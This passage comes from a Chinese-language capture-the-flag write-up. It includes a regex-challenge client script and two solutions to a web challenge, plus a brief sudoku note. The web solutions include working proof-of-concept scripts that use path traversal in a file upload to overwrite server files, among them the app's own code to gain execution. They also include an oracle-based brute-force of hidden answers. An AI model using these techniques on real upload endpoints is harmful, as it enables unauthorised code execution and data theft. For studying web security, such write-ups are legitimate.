1(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1|0)|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1)(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*1|0)*"

io = remote("202.38.93.141", 30303)
# print("> ", io.recvline().decode())
io.recvuntil(b"Please input your token:")
io.sendline(token.encode())
# print("> ", io.recvline().decode())
io.recvuntil(b"Enter difficulty level (1~3):")
io.sendline(level.encode())
# print("> ", io.recvline().decode())
io.recvuntil(b"Enter your regex:")
io.sendline(regex.encode())
data = io.recvall().decode().strip()
print(data)
```

## 禁止内卷

> 此题解使用了 AI 辅助创作，聊天记录见 [CTF 文件读取漏洞](https://chatgpt.com/share/672db23a-8ea4-800f-9a61-e5c38da2212c)。

### 思路 1 - 覆盖

显然，此程序有文件上传漏洞，允许用户覆盖任意文件：

```python
@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("你忘了上传文件")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)
```

我们编写一个简单的 POC 来验证此漏洞：

```python
from requests import Session

URL = "<URL>"
FILE = "data.json" # Any JSON file with 500 [0, 100] integers
x = Session()

r = x.post(URL + "submit", files={
    # "file": (FILE, open(FILE, "rb"))
    "file": ("../web/answers.json", open(FILE, "rb"))
}, allow_redirects=False)

print(r.status_code, r.text)
```

运行此脚本后重新访问主页，可以看到分数为 0，说明已经成功 **覆盖** 了原始数据，主要的问题是如何利用此漏洞来 **读取** 原始数据。

这里其实我想了挺久，最后还是 ChatGPT 的回答 (`方法 1：覆盖 index.html`) 给了我启发。注意到题目特别说明了：

> 而且有的时候助教想改改代码，又懒得手动重启，所以还开了 `--reload`。

这意味着我们可以通过覆盖 `app.py`，从而执行我们自己的代码。那么构造如下 POC：

```python
from requests import Session

URL = "https://chal02-8ab3oyj7.hack-challenge.lug.ustc.edu.cn:8443/"
PAYLOAD = """
from flask import Flask, send_file
import json

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    try:
        return send_file("answers.json")
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    app.run(debug=True)
"""
x = Session()

r = x.post(URL + "submit", files={
    "file": ("../web/app.py", PAYLOAD.encode())
}, allow_redirects=False)

print(r.status_code, r.text)
```

执行此代码 (记得执行前先重启环境，因为原文件已经被覆盖了)，随后重新访问主页，即可获取到 `answers.json` 的内容。之后，使用如下脚本解码，即可得到 flag：

```python
from json import load
from re import match

def decode(l: list[int]) -> str:
    # 将各数字加 65 后使用 ASCII 编码转换
    return ''.join(chr(i + 65) for i in l)

with open("answers.json", "r") as f:
    answers = load(f)

text = decode(answers)
flag = match(r"flag{.*?}", text) # 非贪婪匹配
if flag:
    print(flag.group())
```

### 思路 2 - 推测

实际上，不利用文件上传漏洞，我们也可以通过推测来获取 flag。首先任意生成一个长度 500 范围 $[0, 100]$ 的数组，不妨设置成全部为 $50$，上传至服务器，获得平方差 $x_1$；随后，第一个元素加一，上传至服务器，获得平方差 $x_2$。设第一个元素真实值为 $a_1$，那么我们有 $(50-a_1)^2=x_1$, $(51-a_1)^2=x_2$，解方程即可获得 $a_1$。对于后续元素亦是如此。以下是示例 Python 脚本：

```python
from requests import Session
from json import dumps
from re import search
from time import sleep

URL = "<URL>" # 替换为实际服务器的主页 URL
N = 500
DEFAULT_VALUE = 50
x = Session()

def get_diff(user_guess):
    """提交 user_guess 数组并返回服务器的平方差"""
    r = x.post(URL + "submit", files={
        "file": ("data.json", dumps(user_guess).encode())
    })
    # 从服务器响应中提取平方差
    # <li>评测成功，你的平方差为 742361</li>
    m = search(r"<li>评测成功，你的平方差为 (\d+)</li>", r.text)
    if m:
        return int(m.group(1))
    else:
        raise ValueError("无法从响应中提取平方差")

# 初始猜测值
user_guess = [DEFAULT_VALUE] * N
answers = []
default_diff = get_diff(user_guess) # 获取默认值的平方差

# 遍历每一个元素
for i in range(N):
    sleep(0.1)

    # 第 i 个元素 +1
    user_guess[i] += 1
    adjusted_diff = get_diff(user_guess)

    # 恢复猜测数组
    user_guess[i] = DEFAULT_VALUE

    # 计算真实值
    real = int(DEFAULT_VALUE + 0.5 - (adjusted_diff - default_diff) / 2)
    answers.append(real)

    print(f"Element {i+1}/{N} calculated as: {real}")

# 验证答案
diff = get_diff(answers)
print("Final diff:", diff)
if diff == 0:
    print("🎉 Success!")

print("Answers:", answers)
```

后续的解码过程与思路 1 相同，此处不再赘述。

> Edit: 经提醒，原文件可能含有负数，而进行评分时会将负数转换为 $0$，因此此方法得到的答案并不可靠。

## 零知识数独

### 数独高手

[Sudoku Solver](https://www.sudoku-solutions.com/). 分别通过 Easy, Medium, Hard, Expert 难度的数独题目，得到 flag。
